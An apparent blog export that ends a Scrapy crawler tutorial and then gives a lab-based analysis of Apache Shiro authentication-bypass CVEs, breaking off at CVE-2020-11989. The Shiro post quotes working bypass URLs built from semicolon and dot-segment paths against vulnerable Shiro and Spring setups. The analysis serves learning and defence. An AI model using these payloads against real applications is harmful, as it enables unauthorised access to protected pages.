<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># useful for handling different item types with a single interface</span></span><br><span class="line"><span class="keyword">from</span> itemadapter <span class="keyword">import</span> ItemAdapter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuilianPipeline</span>:</span></span><br><span class="line">    fp = <span class="literal">None</span></span><br><span class="line">    <span class="comment">#重写父类的方法，该方法只会被调用一次，不用被多次调用。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;开始爬虫&quot;</span>)</span><br><span class="line">        self.fp = <span class="built_in">open</span>(<span class="string">&#x27;./content.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        content = item[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.fp.write(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束爬虫&#x27;</span>)</span><br><span class="line">        self.fp.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>items</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuilianItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    content_url = scrapy.Field()</span><br><span class="line">    content = scrapy.Field()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-6图片爬取"><a href="#5-6图片爬取" class="headerlink" title="5.6图片爬取"></a>5.6图片爬取</h2><p>在我们的管道类中给我们封装了一个ImagesPipeline</p>
<p>字符串：只需要基于xpath进行解析提交管道进行持久化存储。</p>
<p>图片：xpath解析出图片src的属性值，单独的对图片地址发起请求获取图片二进制类型的数据。    </p>
<p>而我们的ImagesPipeline</p>
<p>只需要那个img的src的属性值进行解析，提交到管道，管道就会对图片的src进行请求发送获取图片的二进制类型的数据，且还会帮我们进行持久化存储。    </p>
<p>使用流程：</p>
<p><a href="https://www.cnblogs.com/zhanghongfeng/p/7082510.html">python网络爬虫之使用scrapy爬取图片 - 一张红枫叶 - 博客园 (cnblogs.com)</a></p>
<p>嘿嘿我还是更喜欢使用requests模块，这个scrapy感觉更麻烦了，可能也是我没有掌握到这个框架的精髓，以后再来慢慢学习。</p>
<h1 id="6-分布式爬虫-amp-增量式爬虫"><a href="#6-分布式爬虫-amp-增量式爬虫" class="headerlink" title="6.分布式爬虫&amp;增量式爬虫"></a>6.分布式爬虫&amp;增量式爬虫</h1><h2 id="6-1分布式爬虫"><a href="#6-1分布式爬虫" class="headerlink" title="6.1分布式爬虫"></a>6.1分布式爬虫</h2><p>概念：我们需要搭建一个分布式的机群，让其对一组资源进行分布式联合爬取。</p>
<p>作用：提升爬取数据的效率。</p>
<p>如何实现分部试爬虫？</p>
<p>下载个scrapy-redis的组件</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127173730289.png" alt="image-20220127173730289"></p>
<p>这个就是基本的一个结构</p>
<p><code>为什么原生的scrapy不可以实现分部式爬虫？</code><br>调度器不可以被分布式机群共享</p>
<p>管道不可以被分布式机群共享</p>
<p><a href="https://www.cnblogs.com/xiao-apple36/p/12695092.html">使用scrapy实现分布式爬虫 - 一只小小的寄居蟹 - 博客园 (cnblogs.com)</a></p>
<h2 id="6-2增量式爬虫"><a href="#6-2增量式爬虫" class="headerlink" title="6.2增量式爬虫"></a>6.2增量式爬虫</h2><p><a href="https://www.cnblogs.com/open-yang/p/11343413.html">增量式爬虫 - 笑得好美 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>shiro权限绕过方面漏洞分析</title>
    <url>/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="shiro权限绕过方面漏洞分析"><a href="#shiro权限绕过方面漏洞分析" class="headerlink" title="shiro权限绕过方面漏洞分析"></a>shiro权限绕过方面漏洞分析</h1><p>今天来学习权限绕过方面的漏洞，都尽量复现一遍，然后分析分析，我们这里用vulhub靶场吧…</p>
<h1 id="Apache-Shiro-目录遍历漏洞-CVE-2010-3863"><a href="#Apache-Shiro-目录遍历漏洞-CVE-2010-3863" class="headerlink" title="Apache Shiro -目录遍历漏洞 CVE-2010-3863"></a>Apache Shiro -目录遍历漏洞 CVE-2010-3863</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">CVE-2010-3863</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2010-2715">CNVD-2010-2715</a><br>影响版本：<code>shiro &lt; 1.1.0</code> 和<code>JSecurity 0.9.x</code><br>漏洞描述：<code>Shiro</code>进行权限验证前未进行路径标准化，导致使用时可能绕过权限校验<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先分析一下<code>Shiro</code>身份验证的流程：<code>Shiro</code>使用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code> 方法获取和调用要执行的 <code>Filter</code>，逻辑如下：<br>在<code>getPathWithinApplication()</code>方法中调用 <code>WebUtils.getPathWithinApplication()</code>方法，用来获取请求路径。<br>其中<code>getContextPath(request)</code>方法获取 <code>Context</code> 路径（这里这个context可以理解为，当前路径）</p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8b69d2d4-a1be-4e65-aebd-3e0cac3b8b45.png" alt="1.png"></p>
<p><code>getRequestUri(request)</code> 方法获取<code>URI</code> 的值，并调用 <code>decodeAndCleanUriString()</code> 处理。</p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/72ea7fd0-3603-43ca-a020-b58e9311180f.png" alt="2.png"></p>
<p>在<code>decodeAndCleanUriString()</code>中对 <code>;</code> 进行了截取。<br>此时<code>contextPath</code>值为<code>/samples_web_war</code>，<code>requestUri</code>值为<code>/samples_web_war/login.jsp</code><br>然后判断<code>requestUri</code>是否以<code>contextPath</code>开始，是的话将其替换为<code>/</code><br>其实这里面可以吧<code>requestUri</code>理解为路由</p>
<p>处理之后的请求 <code>URL</code> 将会使用 <code>AntPathMatcher#doMatch</code> 进行权限验证。<br>此时发现，<code>Shiro</code>中对<code>URI</code>并没有进行路径的标准化处理，这样当<code>URI</code>中存在特殊字符时，就存在绕过风险</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line">/login.jsp = authc</span><br><span class="line">/logout = logout</span><br><span class="line">/account/** = authc</span><br><span class="line">/remoting.jsp = authc, perms[&quot;audit:list&quot;]</span><br><span class="line">/** = anon</span><br></pre></td></tr></table></figure>

<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240209011817441.png" alt="image-20240209011817441"></p>
<h1 id="Apache-Shiro-‘login-jsp’安全绕过漏洞-CVE-2014-0074"><a href="#Apache-Shiro-‘login-jsp’安全绕过漏洞-CVE-2014-0074" class="headerlink" title="Apache Shiro ‘login.jsp’安全绕过漏洞 CVE-2014-0074"></a>Apache Shiro ‘login.jsp’安全绕过漏洞 CVE-2014-0074</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号： <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2014-0074</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2014-03861">CNVD-2014-03861</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-460">SHIRO-460</a><br>影响版本：<code>shiro 1.x &lt; 1.2.3</code><br>漏洞描述 ：当程序使用<code>LDAP</code>服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">Commit</a></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当使用了未经身份验证绑定的 <code>LDAP</code> 服务器时，允许远程攻击者通过空用户名或空密码绕过身份验证。</p>
<h1 id="Shiro-lt-1-3-2-验证绕过漏洞-CVE-2016-6802"><a href="#Shiro-lt-1-3-2-验证绕过漏洞-CVE-2016-6802" class="headerlink" title="Shiro &lt; 1.3.2 验证绕过漏洞 CVE-2016-6802"></a>Shiro &lt; 1.3.2 验证绕过漏洞 CVE-2016-6802</h1><h2 id="漏洞信息-2"><a href="#漏洞信息-2" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6802">CVE-2016-6802</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-07814">CNVD-2016-07814</a><br>影响版本：<code>shiro &lt; 1.3.2</code><br>漏洞描述：<code>Shiro</code>未对<code>ContextPath</code>做路径标准化导致权限绕过<br>漏洞补丁： <a href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit</a><br>参考 ： <a href="https://su18.org/post/shiro-2/#cve-2016-6802">su18师傅</a></p>
<h2 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h2><p>本漏洞类似 <code>CVE-2010-3863</code>，依旧是路径标准化导致的问题，不过之前是在 <code>RequestURI</code> 上，本漏洞是在 <code>ContextPath</code> 上。<br>之前提到，<code>Shiro</code> 调用 <code>WebUtils.getPathWithinApplication()</code> 方法获取请求路径。逻辑如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    String contextPath = <span class="keyword">this</span>.getContextPath(request);</span><br><span class="line">    String requestUri = <span class="keyword">this</span>.getRequestUri(request);</span><br><span class="line">    String path = <span class="keyword">this</span>.getRemainingPath(requestUri, contextPath, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasText(path) ? path : <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> requestUri;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中调用 <code>getContextPath()</code> 方法，获取 <code>contextPath</code> ；调用 <code>getRequestUri()</code> 方法，获取 <code>uri</code> ；</p>
<p>在<code>getContextPath()</code> 方法调用 <code>decodeRequestString</code> 进行 <code>URLDecode</code>。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5fd0ae7e-3eb0-48c9-8d8c-dc40a9068eda.png" alt="6802_2.png"><br>由于获取的 <code>ContextPath</code> 没有标准化处理，如果出现一些特殊字符使<code>ContextPath</code>与实际不符，都会导致在 <code>StringUtils.startsWithIgnoreCase()</code> 方法判断时失效，直接返回完整的<code>RequestURI</code>。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>登录账户<code>lonestarr</code>，该账户对页面<code>remoting.jsp</code>没有访问权限，在跟路径前加任意路径，再加<code>../</code>即可实现绕过<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5c1b2b68-a571-4d2f-b164-7626762228e9.png" alt="6802_3.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/e7e0dcfe-1ffc-40fe-9fc7-0e805c9e939d.png" alt="6802_4.png"></p>
<p>这么一看哈，其实，感觉，也没那么难？<br>我要成为厉害的人！</p>
<h1 id="Shiro-lt-1-5-2-验证绕过漏洞-CVE-2020-1957"><a href="#Shiro-lt-1-5-2-验证绕过漏洞-CVE-2020-1957" class="headerlink" title="Shiro &lt; 1.5.2 验证绕过漏洞 CVE-2020-1957"></a>Shiro &lt; 1.5.2 验证绕过漏洞 CVE-2020-1957</h1><h2 id="漏洞信息-3"><a href="#漏洞信息-3" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1957">CVE-2020-1957</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-20984">CNVD-2020-20984</a> /<a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a><br>影响版本：<code>shiro &lt; 1.5.2</code><br>漏洞描述：利用 <code>Shiro</code> 和 <code>Spring</code> 对 <code>URL</code> 的处理的差异化，越权并成功访问。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit</a> <a href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit</a> [Commit](</p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="SHIRO-682"><a href="#SHIRO-682" class="headerlink" title="SHIRO-682"></a>SHIRO-682</h3><p>本漏洞起源于 <a href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a>。在 <code>Spring</code> 中，<code>/resource/xx</code> 与 <code>/resource/xx/</code> 都会被截成<code>/resource/xx</code>以访问相应资源；在 <code>shiro</code> 中，<code>/resource/xx</code> 与 <code>/resource/xx/</code>被视为两个不同路径。所以在 <code>Spring</code> 集成 <code>shiro</code> 时，只需要在访问路径后添加 <code>/</code> 就存在绕过权限校验的可能。<br>下面通过复现进行分析(分析、测试版本<code>1.4.2</code>)：<br>首先<code>shiro.ini</code>中[urls]配置如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[urls]</span><br><span class="line"># anon：匿名拦截器，不需登录就能访问，一般用于静态资源，或者移动端接口。</span><br><span class="line"># authc：登录拦截器，需要登录认证才能访问的资源。</span><br><span class="line">/login.jsp = authc</span><br><span class="line">/logout = logout</span><br><span class="line">/toJsonPOJO = authc, perms[&quot;audit:list&quot;]</span><br><span class="line">/** = anon</span><br></pre></td></tr></table></figure>

<p>输入<code>/toJsonPOJO</code>时，<code>shiro</code>对其进行判断，从<code>shiro.ini</code>或其他配置中进行匹配。当匹配到<code>/toJsonPOJO</code>时，匹配成功，跳出循环。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0eeebd05-e6d1-4f9c-bdee-81a19e9e0bfe.png" alt="1957_1.png"><br>此时，跳转至登陆界面。<br>输入<code>/toJsonPOJO/</code>时，<code>shiro</code>对其进行判断，当匹配到<code>/toJsonPOJO</code>时，匹配失败，继续匹配；当匹配到<code>/**</code>时，匹配成功，跳出循环。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/b03cd4d9-153d-4db8-954c-7b9a2e22ee03.png" alt="1957_2.png"><br>接着到了<code>springframework</code>中的判断，这里<code>/toJsonPOJO</code>和<code>/toJsonPOJO</code>是可以匹配成功的<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/091bc105-d92c-4ec3-a55f-8cb9f684705c.png" alt="1957_3.png"><br>此时，成功绕过<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/a4198c53-e6b9-4fd4-a219-e331324df0fd.png" alt="1957_4.png"></p>
<h3 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h3><p>除了上面的绕过方式，本 <code>CVE</code> 还存在另一个绕过。利用的是 <code>shiro</code> 和 <code>spring</code> 对 <code>url</code> 中的 <code>;</code> 处理的差异进行绕过并成功访问。<br>分析、测试版本<code>1.4.2</code></p>
<h4 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h4><p>首先进入<code>Shiro</code>中<br>首先在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver.class#getChain</code>处下断点，进行调试，访问<code>http://localhost:8080/xx/..;/toJsonPOJO</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/58ac56e6-905b-43b6-9ac9-a7e8e9a0ce20.png" alt="1957_6.png"></p>
<p>单步调试进入<code>this.getPathWithinApplication(request)</code>，在<code>WebUtils#getPathWithinApplication()</code>中，通过<code>getContextPath(request)</code>，获取到上下文信息后，再用<code>getRequestUri(request)</code>获取具体的<code>uri</code>。进入<code>getRequestUri()</code>方法，在<code>return</code>前，获取到的<code>uri</code>为<code>/xx/..;/toJsonPOJO</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8cb3a1b2-c420-493e-9658-80aa7949b167.png" alt="1957_5.png"><br>接下来分析一下<code>return normalize(decodeAndCleanUriString(request, uri));</code><br>首先进入<code>decodeAndCleanUriString</code><br>传入的参数<code>uri</code>是<code>/xx/..;/toJsonPOJO</code>,然后通过语句<code>int semicolonIndex = uri.indexOf(59);</code>找出<code>uri</code>中分号的位置，<code>59</code>也就是<code>;</code>的<code>ASCII码</code><br>如果<code>uri</code>中有分号，就返回分号前的字段，否则返回整个<code>uri</code>。<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9c0e7040-2472-4798-beaf-ed29fb64bd96.png" alt="1957_7.png"><br>接着进入<code>normalize</code>，参数<code>uri</code>已经变成<code>/xx/..</code>，<code>normalize</code>内部对传入的路径进行标准化规范处理，相关操作包括替换反斜线、替换<code>//</code>为<code>/</code>等，最后得到返回的<code>uri</code><br>此时<code>return normalize(decodeAndCleanUriString(request, uri));</code>结果为<code>/xx/..</code>，也就是说<code>getRequestUri(request)</code>获取的<code>uri</code>为<code>/xx/..</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/99dac7f5-cdda-4112-ab13-03d2eb73de42.png" alt="1957_8.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7f690de9-2256-44f1-b5fd-e5ca65cf23a6.png" alt="1957_9.png"></p>
<p>一路回到<code>getChain</code>，经过上面的步骤，得到<code>requestURI</code>值为<code>/xx/..</code>，接下来在<code>while</code>循环里使用<code>pathMatches(pathPattern, requestURI)</code>进行权限校验，此时只有<code>/**</code>能够与<code>/xx/..</code>匹配成功，<code>/**</code>是<code>anon</code>权限，不需要登陆就能访问，绕过了<code>/toJsonPOJO</code>的<code>authc</code>权限<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/eb6bfd71-7953-4f04-b080-d457521216c1.png" alt="1957_10.png"></p>
<p>此时<code>Shiro</code>部分的权限绕过了，那么<code>Spring</code>部分的路径是怎么匹配的呢？<br><code>url</code>经过<code>shiro</code>的处理认证通过后，就会进入<code>spring</code>中进行解析，我们在<code>UrlPathHelper#getLookupPathForRequest</code>下断点<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4e5270b9-674b-4d81-8f14-4d9d4417a795.png" alt="1957_11.png"><br>先进入<code>getPathWithinApplication()</code>，通过<code>this.getRequestUri(request)</code>获取<code>uri</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12c2502a-53d7-46b9-9497-596601e4fee6.png" alt="1957_12.png"><br>获取到的<code>uri</code>值为<code>/xx/..;/toJsonPOJO</code>，在<code>return</code>之前进入<code>decodeAndCleanUriString(request, uri)</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/912bdec5-e0e0-472e-b9a8-bd18d436cef5.png" alt="1957_14.png"><br>传进来的参数<code>uri</code>为<code>/xx/..;/toJsonPOJO</code>，经过<code>removeSemicolonContent(uri)</code>后移除<code>uri</code>中<code>/</code>与<code>/</code>之间的的分号以及分号后面的内容；经过<code>decodeRequestString(request, uri)</code>后对<code>uri</code>进行解码；经过<code>getSanitizedPath(uri)</code>后将路径中<code>//</code>替换为<code>/</code>。此时返回的<code>uri</code>值为<code>/xx/../toJsonPOJO</code><br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/186126cc-0c5c-4e96-8ab6-82b9293f5e6a.png" alt="1957_15.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3dd16058-dfe0-490f-801c-7174e70e80e2.png" alt="1957_16.png"><br>步入<code>getPathWithinServletMapping()</code>后，传入的参数<code>pathWithinApp</code>值为<code>/xx/../toJsonPOJO</code>。依次通过<code>UrlPathHelper#getServletPath</code>、<code>HttpServletRequestWrapper#getServletPath</code>、<code>Request#getServletPath</code>获取到我们实际访问的<code>url：http://localhost:8080/toJsonPOJO</code>后返回，最终实现绕过权限访问<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ff536e79-bbd8-4a47-8874-b0efe3efcdd5.png" alt="1957_13.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/cf0f72b6-0f2c-4464-9aa3-8e0840649fb9.png" alt="1957_17.png"></p>
<p>经过测试当<code>uri</code>为<code>123;/..;345/;../.;/alter/..;/;/;///////;/;/;awdwadwa/toJsonPOJO</code>时，<code>Shiro</code>对<code>/123</code>进行权限验证;<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7f8791b7-7b05-4055-95fb-d0fdfcf529fb.png" alt="1957_18.png"><br><code>Spring</code>的<code>org.springframework.web.util.UrlPathHelper</code>中，<code>getPathWithinApplication(request)</code>值为<code>/123/.././alter/../toJsonPOJO</code>;<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/a4d3fb7f-5cd7-42f7-82ed-40d6a61e8a8f.png" alt="1957_19.png"></p>
<p><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5c1cea97-9c06-4124-a284-bdfc226eba0f.png" alt="1957_20.png"><br><code>this.getPathWithinServletMapping(request, pathWithinApp)</code>值为<code>/toJsonPOJO</code>，可以进行绕过<br><img src="/2024/02/12/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%96%B9%E9%9D%A2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/63836c5d-80db-4f6f-97ad-ea31f6d428a1.png" alt="1957_21.png"></p>
<p>上面这个 <code>payload</code> 只能在较低版本的 <code>Spring Boot</code> 上使用。<br>根据<a href="http://rui0.cn/archives/1643">Ruil1n 师傅</a>介绍:<br>当 <code>Spring Boot</code> 版本在小于等于 <code>2.3.0.RELEASE</code> 的情况下，<code>alwaysUseFullPath</code> 为默认值 <code>false</code>，这会使得其获取 <code>ServletPath</code> ，所以在路由匹配时相当于会进行路径标准化包括对 <code>%2e</code> 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 <code>alwaysUseFullPath</code> 自动配置成了 <code>true</code> 从而开启全路径，又可能导致一些安全问题。<br>所以在高版本上只能试着寻找逻辑上有没有漏洞，然后进行绕过。比如程序配置了访问路径 <code>/alter/**</code> 为 <code>anon</code>，但是指定了其中的一个 <code>/alter/page</code>为 <code>authc</code>。这时在不跳目录的情况下，可以使用如下请求绕过：<br><code>http://127.0.0.1:8080/alter//;aaaa/;...///////;/;/;awdwadwa/page</code></p>
<p>我这里末尾加了/才成功。不过也无所谓了</p>
<h1 id="Apache-Shiro-lt-1-5-3-权限绕过漏洞-CVE-2020-11989"><a href="#Apache-Shiro-lt-1-5-3-权限绕过漏洞-CVE-2020-11989" class="headerlink" title="Apache Shiro &lt; 1.5.3 权限绕过漏洞 CVE-2020-11989"></a>Apache Shiro &lt; 1.5.3 权限绕过漏洞 CVE-2020-11989</h1><h2 id="漏洞信息-4"><a href="#漏洞信息-4" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1957">CVE-2020-11989</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-20984">SHIRO-782</a><br>影响版本：<code>shiro &lt; 1.5.3</code><br>漏洞描述：在<code>Shiro &lt; 1.5.3</code>的情况下，将<code>Shiro</code>与<code>Spring Controller</code>一起使用时，相应请求可能会导致身份验证绕过。<br>漏洞补丁：<a href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit</a><br>参考： <a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">腾讯安全玄武实验室 Ruilin师傅</a> <a href="https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA">边界无限 淚笑师傅</a></p>
<p>这个漏洞有两种绕过方式，分别由腾讯安全玄武实验室的<code>Ruilin</code>师傅和来自边界无限的淚笑师傅报告</p>
